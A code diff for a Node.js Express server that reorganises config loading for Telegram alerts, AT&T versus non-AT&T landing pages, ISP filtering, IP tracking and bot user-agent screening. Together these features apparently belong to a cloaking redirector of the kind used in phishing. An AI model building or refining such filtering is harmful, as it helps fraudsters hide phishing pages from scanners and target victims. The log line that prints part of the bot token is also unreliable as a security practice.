@@ -9,11 +9,24 @@ const fs = require('fs').promises;
 const fssync = require('fs');
 const net = require('net');
 
+// 1. LOAD CONFIG FIRST
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const ATT_LANDING_PAGE = process.env.ATT_LANDING_PAGE;
+const NON_ATT_LANDING_PAGE = process.env.NON_ATT_LANDING_PAGE;
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
+const MOBILE_ISPS = (process.env.MOBILE_ISPS || "").split(',').map(isp => isp.trim()).filter(isp => isp !== "");
+
+if (!ADMIN_TOKEN || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !ATT_LANDING_PAGE || !NON_ATT_LANDING_PAGE) {
+    console.error('FATAL ERROR: Required environment variables are missing.');
+    // Don't exit(1) immediately on Render so we can see logs
+}
+
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Trust proxy for accurate IP detection behind load balancers
-app.set('trust proxy', true);
+// Render uses a single proxy hop
+app.set('trust proxy', 1);
 
 // Path to store visited IPs
 const VISITED_IPS_FILE = path.join(__dirname, 'visited_ips.json');
@@ -22,34 +35,29 @@ const SETTINGS_FILE = path.join(__dirname, 'settings.json');
 
 // Cache for file-based data
 let cache = {
-    visitedIps: null,
-    forcedIps: null,
-    settings: null
+    visitedIps: [],
+    forcedIps: [],
+    settings: { isSuspiciousEnabled: true, isIspFilterEnabled: true }
 };
 
 // Ensure the files exist and load cache
 async function initCache() {
     try {
-        if (!fssync.existsSync(VISITED_IPS_FILE)) {
-            fssync.writeFileSync(VISITED_IPS_FILE, JSON.stringify([]));
-        }
-        if (!fssync.existsSync(FORCED_IPS_FILE)) {
-            fssync.writeFileSync(FORCED_IPS_FILE, JSON.stringify([]));
-        }
-        if (!fssync.existsSync(SETTINGS_FILE)) {
-            fssync.writeFileSync(SETTINGS_FILE, JSON.stringify({ 
-                isSuspiciousEnabled: true,
-                isIspFilterEnabled: true 
-            }));
-        }
+        if (!fssync.existsSync(VISITED_IPS_FILE)) fssync.writeFileSync(VISITED_IPS_FILE, JSON.stringify([]));
+        if (!fssync.existsSync(FORCED_IPS_FILE)) fssync.writeFileSync(FORCED_IPS_FILE, JSON.stringify([]));
+        if (!fssync.existsSync(SETTINGS_FILE)) fssync.writeFileSync(SETTINGS_FILE, JSON.stringify(cache.settings));
 
         cache.visitedIps = JSON.parse(await fs.readFile(VISITED_IPS_FILE, 'utf8'));
         cache.forcedIps = JSON.parse(await fs.readFile(FORCED_IPS_FILE, 'utf8'));
         cache.settings = JSON.parse(await fs.readFile(SETTINGS_FILE, 'utf8'));
-        console.log('Cache initialized successfully');
+        
+        console.log('--- Render Startup Check ---');
+        console.log(`TELEGRAM_BOT_TOKEN: ${TELEGRAM_BOT_TOKEN ? '✅ LOADED (' + TELEGRAM_BOT_TOKEN.substring(0,6) + '...)' : '❌ MISSING'}`);
+        console.log(`TELEGRAM_CHAT_ID: ${TELEGRAM_CHAT_ID ? '✅ LOADED' : '❌ MISSING'}`);
+        console.log(`ADMIN_TOKEN: ${ADMIN_TOKEN ? '✅ LOADED' : '❌ MISSING'}`);
+        console.log('---------------------------');
     } catch (err) {
         console.error('Failed to initialize cache:', err);
-        process.exit(1);
     }
 }
 initCache();
@@ -162,19 +170,6 @@ function escapeHtml(str) {
         .replace(/>/g, '&gt;')
         .replace(/"/g, '&quot;')
         .replace(/'/g, '&#39;');
-}
-
-// IMPORTANT: These environment variables must be provided by the hosting environment
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const ATT_LANDING_PAGE = process.env.ATT_LANDING_PAGE;
-const NON_ATT_LANDING_PAGE = process.env.NON_ATT_LANDING_PAGE;
-const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
-const MOBILE_ISPS = (process.env.MOBILE_ISPS || "").split(',').map(isp => isp.trim()).filter(isp => isp !== "");
-
-if (!ADMIN_TOKEN || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !ATT_LANDING_PAGE || !NON_ATT_LANDING_PAGE) {
-    console.error('FATAL ERROR: Required environment variables (ADMIN_TOKEN, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ATT_LANDING_PAGE, NON_ATT_LANDING_PAGE) are missing from the hosting environment.');
-    process.exit(1);
 }
 
 const BOT_USER_AGENTS = [
